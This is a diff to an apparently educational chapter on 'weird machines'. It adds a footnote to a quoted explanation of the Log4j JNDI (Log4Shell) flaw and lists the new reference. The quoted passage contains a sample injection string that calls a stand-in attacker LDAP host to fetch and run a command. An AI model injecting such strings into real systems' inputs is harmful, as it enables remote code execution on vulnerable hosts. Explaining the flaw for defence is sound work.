@@ -214,7 +214,7 @@ For readers wanting a formal proof, Dullien further solidifies the weird machine
 >
 > * Many log sites in a codebase write external, attacker-controlled values directly into the logged string. A host's User Agent is one example, since it can be configured. Coupled with expansion/meta-programming, we lose a **non-repudiation** property - the attacker controls log message contents and can falsify data to cover their tracks.
 >
-> * It gets worse: we also lose all assurance as well. As of 2013, Log4j offers integration with the Java Naming and Directory Interface (JNDI). This functionality, intended for remote lookups, allows fetching and running Java classes from a remote server. If an attacker can get a string like `${jndi:ldap://evildomain.net:1337/Basic/Command/Base64/SOME_BASE64_CMD}` into a log, the victim's host will connect to an attacker-controlled server, fetch an arbitrary malicious command, and execute it locally.
+> * It gets worse: we also lose all assurance as well. As of 2013, Log4j offers integration with the Java Naming and Directory Interface (JNDI). This functionality, intended for remote lookups, allows fetching and running Java classes from a remote server. If an attacker can get a string like `${jndi:ldap://evildomain.net:1337/Basic/Command/Base64/SOME_BASE64_CMD}` into a log[^HutchinsLog4J], the victim's host will connect to an attacker-controlled server, fetch an arbitrary malicious command, and execute it locally.
 >
 > In this example of command injection, the weird machine is programmed with a specially crafted string addressing an attacker-controlled server.
 > Untrusted log data becomes code executed with the privileges of the victim process.
@@ -280,3 +280,5 @@ In the next section, we'll put these concepts into play hands-on to reduce secre
 [^Log4J]: [*Apache Log4j Vulnerability Guidance*](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance). CISA (2021).
 
 [^ComputerphileLog4J]:  [*Log4J & JNDI Exploit: Why So Bad?*](https://www.youtube.com/watch?v=Opqgwn8TdlM). Computerphile (2021).
+
+[^HutchinsLog4J]:  [*Log4j (CVE-2021-44228) RCE Vulnerability Explained*](https://www.youtube.com/watch?v=0-abhd-CLwQ). Marcus Hutchins (2021).
